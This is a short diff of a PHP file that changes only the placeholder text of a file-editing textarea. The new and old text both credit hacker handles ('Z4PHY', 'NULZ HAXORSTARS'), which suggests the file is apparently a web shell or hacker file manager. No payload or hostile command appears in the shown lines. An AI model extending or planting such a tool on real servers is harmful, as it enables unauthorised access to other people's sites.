@@ -1690,7 +1690,7 @@ $path = str_replace("\\", "/", $path);
             </select><br><br>
             <div id="divCodeWrapper">
                 <pre id="preCode"><code id="codeBlock" class="language-html"></code></pre>
-                <textarea name="filecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder="R3C0D3R BY Z4PHY THANKS TO NULZ HAXORSTARS"></textarea>
+                <textarea name="filecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder=" Z4PHY x NULZ HAXORSTARS"></textarea>
             </div>
             <script type="text/javascript">
             const textarea1 = document.getElementById("textarea1");
